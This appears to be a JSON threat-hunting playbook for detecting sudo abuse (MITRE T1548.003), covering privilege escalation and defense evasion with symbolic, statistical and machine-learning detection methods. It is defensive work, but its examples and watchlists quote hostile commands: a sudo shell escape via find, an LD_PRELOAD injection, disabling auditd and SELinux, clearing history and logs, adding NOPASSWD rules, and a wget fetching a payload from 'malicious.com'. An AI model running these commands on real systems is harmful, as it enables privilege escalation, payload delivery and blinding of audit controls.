[
  {
    "information_requirement": "Has the adversary escalated privileges using sudo or sudo caching?",
    "tactic_id": "TA0004",
    "tactic_name": "Privilege Escalation",
    "indicators": [
      {
        "technique_id": "T1548.003",
        "name": "Sudo and Sudo Caching",
        "evidence": [
          {
            "description": "Execution of `sudo` with a command whose SHA256 hash matches a known malicious tool, or whose process lineage originates from a suspicious parent process (e.g., a web shell).",
            "data_sources": [
              "Linux Auditd logs (syscall execve records with euid=0)",
              "Sysmon for Linux Event ID 1 (Process Creation)",
              "EDR process and file creation logs"
            ],
            "data_platforms": [
              "TBD"
            ],
            "nai": "Critical Linux/macOS servers (e.g., web, database, authentication), Developer and administrator workstations",
            "action": "1. (Symbolic) Continuously monitor process creation logs for `sudo` executions. For each, calculate the hash of the executed binary and compare it against a threat intelligence feed of known malicious binaries. Generate a high-severity alert on any match. 2. (Statistical) For each `sudo` execution, analyze the parent process. Maintain a baseline of common parent processes for `sudo` (e.g., `bash`, `zsh`, `sshd`). Calculate the frequency of each parent process across the environment. Alert on `sudo` executions spawned by statistically rare parents (e.g., those in the bottom 5th percentile of frequency, such as `nginx`, `apache2`, or `node`). 3. (Machine Learning) Train a decision tree or logistic regression classifier on labeled historical `sudo` events, using features like the command executed, parent process name, user, and TTY presence. Use the trained model to score new `sudo` events in real-time, alerting on those classified as high-probability malicious."
          },
          {
            "description": "Use of `sudo` with command-line arguments that create a shell, load a shared object, or execute arbitrary code, such as `sudo find . -exec /bin/sh \\;` or `sudo LD_PRELOAD=/tmp/evil.so /usr/bin/id`.",
            "data_sources": [
              "Linux Auditd logs (syscall execve records with full command line)",
              "Sysmon for Linux Event ID 1 (Process Creation with CommandLine)",
              "/var/log/auth.log or equivalent with `log_input`/`log_output` enabled in sudoers"
            ],
            "data_platforms": [
              "TBD"
            ],
            "nai": "All Linux/macOS endpoints and servers with `sudo` installed",
            "action": "1. (Symbolic) Deploy a SIEM rule that uses regular expressions to search command-line arguments of `sudo` executions for known living-off-the-land binary (LOLBin) abuse patterns, such as `sudo (nmap|find|awk|perl|python) .*(-c|--interactive|BEGIN \\{system\\()`, or environment variable abuse like `sudo LD_.*=`. 2. (Statistical) For all `sudo` commands, calculate the Shannon entropy of the command-line arguments. Establish a baseline entropy score for legitimate administrative commands. Alert on commands with entropy scores exceeding 3 standard deviations above the mean for that user or system, as this indicates likely obfuscation. 3. (Machine Learning) Use a clustering algorithm like DBSCAN on vectorized `sudo` command-line arguments. This will group legitimate, repetitive administrative commands together. Treat commands that fall outside of any cluster (noise points) as anomalies requiring investigation, as they represent unique and potentially malicious usage."
          },
          {
            "description": "A `sudo` command is executed by a user account that has never executed `sudo` before, or the command itself is statistically rare for that user's established baseline of activity.",
            "data_sources": [
              "Linux Auditd logs (auid vs euid)",
              "Sysmon for Linux Event ID 1",
              "Authentication logs (/var/log/secure, /var/log/auth.log)",
              "Zeek ssh.log"
            ],
            "data_platforms": [
              "TBD"
            ],
            "nai": "Authentication servers, Identity and Access Management systems (e.g., FreeIPA/AD), All Linux/macOS endpoints",
            "action": "1. (Symbolic) Maintain an explicit list of users/groups authorized for `sudo` access based on the `sudoers` configuration. Monitor audit logs for any `sudo` execution where the executing user (`auid` in auditd) is not on the authorized list. 2. (Statistical) For each authorized `sudo` user, build a historical profile of commands they execute. Use a frequency distribution of their commands. Alert when a user executes a command that is in the bottom 5% of their command frequency (a 'rare' command for them) or a command they have never run before. 3. (Machine Learning) Implement a time-series anomaly detection model (e.g., ARIMA) on the volume of `sudo` commands per user per hour. An alert is triggered if the volume for a user suddenly spikes beyond the predicted forecast range, which could indicate automated abuse."
          },
          {
            "description": "Multiple `sudo` commands are executed from a non-interactive shell (e.g., pty/tty is null) within the `sudo` credential cache timeout window, following an initial interactive `sudo` execution.",
            "data_sources": [
              "Linux Auditd logs (including tty field)",
              "Sysmon for Linux Event ID 1 (including TerminalSessionId)",
              "File access logs for /var/db/sudo/ or /var/run/sudo/ts/"
            ],
            "data_platforms": [
              "TBD"
            ],
            "nai": "All Linux/macOS hosts, particularly multi-user servers, Cron job and script execution environments",
            "action": "1. (Symbolic) Create a rule to detect `sudo` process creation events where the `tty` field is null or absent AND the execution occurs within 15 minutes (default timeout) of a previous `sudo` event from the same user that DID have a `tty`. This specifically targets non-interactive cache abuse. 2. (Statistical) For each user, calculate the time delta between consecutive `sudo` commands. A sudden shift in the distribution towards a high frequency of short-delta executions, especially when correlated with non-interactive sessions, is anomalous. Alert when the median time delta for a user drops below a learned threshold (e.g., 10th percentile of their historical median). 3. (Machine Learning) Use a Hidden Markov Model (HMM), where states are 'interactive sudo', 'non-interactive sudo', and 'no sudo'. Train the model on normal user behavior. A transition from 'interactive sudo' to a rapid sequence of 'non-interactive sudo' states with a high probability would be flagged as an anomalous sequence indicative of cache abuse."
          }
        ]
      }
    ],
    "version": "2.2",
    "date_created": "2025-05-04",
    "last_updated": "2025-09-29",
    "contributors": [
      "Zachary Szewczyk"
    ]
  },
  {
    "information_requirement": "Is the adversary evading detection by modifying `sudo` configurations or its logging behavior?",
    "tactic_id": "TA0005",
    "tactic_name": "Defense Evasion",
    "indicators": [
      {
        "technique_id": "T1548.003",
        "name": "Sudo and Sudo Caching",
        "evidence": [
          {
            "description": "The `/etc/sudoers` file or a file within `/etc/sudoers.d/` is modified to include strings such as `!audit`, `!syslog`, or `logfile=/dev/null`.",
            "data_sources": [
              "File Integrity Monitoring (FIM) logs",
              "Linux Auditd logs (syscall write on /etc/sudoers and /etc/sudoers.d/)"
            ],
            "data_platforms": [
              "TBD"
            ],
            "nai": "Configuration management servers (e.g., Ansible, Puppet, Chef), All Linux/macOS hosts",
            "action": "1. (Symbolic) Deploy an FIM rule that alerts on any change to `/etc/sudoers` or files in `/etc/sudoers.d/`. The rule should inspect the file `diff` and trigger a high-severity alert if the added/modified lines contain the regex patterns `!audit`, `!syslog`, or `logfile=.../dev/null`. 2. (Statistical) Baseline the rate of change for `sudoers` files across the environment. Most systems should have a change rate near zero. Alert on any host whose `sudoers` change rate deviates significantly from the baseline, especially if the change is not correlated with a configuration management or patching event. 3. (Machine Learning) Train a classification model to distinguish between legitimate (e.g., by Puppet) and suspicious (e.g., by bash) `sudoers` file modifications. Features can include the user/process making the change, time of day, and the content of the change itself. Use this to score and prioritize FIM alerts."
          },
          {
            "description": "The `/etc/sudoers` file or a file within `/etc/sudoers.d/` is modified to add or expand a `NOPASSWD` rule, or to add the `Defaults !tty_tickets` directive.",
            "data_sources": [
              "File Integrity Monitoring (FIM) logs",
              "Linux Auditd logs (watching /etc/sudoers and /etc/sudoers.d/)",
              "Sysmon for Linux Event ID 1 (Process Creation)"
            ],
            "data_platforms": [
              "TBD"
            ],
            "nai": "Configuration management servers, All Linux/macOS hosts, especially developer workstations and multi-user servers",
            "action": "1. (Symbolic) Create a rule that triggers on FIM alerts for `sudoers` files. The rule logic should specifically search the change content for the addition of `NOPASSWD:` or `!tty_tickets`. Correlate this alert with a subsequent process execution of `killall Terminal` or `pkill -HUP sudo` by the same user within 5 minutes. 2. (Statistical) Analyze the 'blast radius' of `NOPASSWD` rules. Assign a risk score to each rule based on the user/group it applies to and the commands allowed (`ALL` is riskiest). Monitor for changes that increase the aggregate risk score for a system beyond a set threshold. 3. (Machine Learning) Model users, groups, and commands as nodes in a graph. A legitimate change might add a single, targeted edge. A malicious change, like adding a broad `NOPASSWD: ALL` rule, creates a high-impact edge. Detect such structurally significant changes as anomalies in the permissions graph."
          },
          {
            "description": "A `sudo` command is executed to disable a security service, clear logs, or disable shell history, such as `sudo systemctl stop auditd` or `sudo history -c`.",
            "data_sources": [
              "Linux Auditd logs (syscall execve with full command line)",
              "Sysmon for Linux Event ID 1 (Process Creation with CommandLine)",
              "Zeek command.log"
            ],
            "data_platforms": [
              "TBD"
            ],
            "nai": "Security infrastructure servers (e.g., SIEM forwarders, EDR management consoles), All Linux/macOS hosts",
            "action": "1. (Symbolic) Maintain a watchlist of high-risk command strings related to defense evasion (e.g., `systemctl stop auditd`, `auditctl -e 0`, `setenforce 0`, `history -c`, `set +o history`, `rm /var/log/*`). Create a SIEM rule to generate a critical alert whenever any of these commands are executed via `sudo`. 2. (Statistical) Profile the `sudo` command vocabulary for each system role (e.g., web server). Identify commands that are common for administration. Flag any `sudo` execution of a command that is not in the top 95% of commands for that system's role profile, giving it a high anomaly score. 3. (Machine Learning) Use a sequence-to-sequence (seq2seq) model to learn normal sequences of administrative commands (e.g., `sudo apt update` is often followed by `sudo apt upgrade`). An anomalous sequence, such as `sudo systemctl stop auditd` followed by `sudo wget http://malicious.com/payload.sh`, would be flagged as a low-probability sequence."
          },
          {
            "description": "A `sudo` command is executed from an unusual parent process (e.g., `apache2`, `nginx`) or contains heavily obfuscated arguments (e.g., multiple layers of Base64 encoding).",
            "data_sources": [
              "Linux Auditd logs (with parent process PID/name)",
              "Sysmon for Linux Event ID 1 (with ParentImage and CommandLine)",
              "Zeek conn.log"
            ],
            "data_platforms": [
              "TBD"
            ],
            "nai": "Internet-facing servers (e.g., web servers, API gateways), Application servers",
            "action": "1. (Symbolic) Create a rule that alerts when the parent process name for a `sudo` execution is on a list of typically non-interactive or suspicious parents (e.g., `apache2`, `httpd`, `nginx`, `php-fpm`, `node`, `nc`). Correlate with network connection logs (e.g., Zeek conn.log) to see if the parent process has active external connections. 2. (Statistical) For each `sudo` command argument, calculate its Shannon entropy. Alert if a command's argument entropy exceeds 3 standard deviations above the mean for that specific command, indicating potential obfuscation. 3. (Machine Learning) Train a One-Class SVM on features of legitimate `sudo` executions (parent process, user, command entropy, TTY presence). This model learns a boundary around normal activity. Any new execution that falls outside this boundary is classified as an anomaly, suitable for flagging novel `sudo` use."
          }
        ]
      }
    ],
    "version": "2.2",
    "date_created": "2025-05-04",
    "last_updated": "2025-09-29",
    "contributors": [
      "Zachary Szewczyk"
    ]
  }
]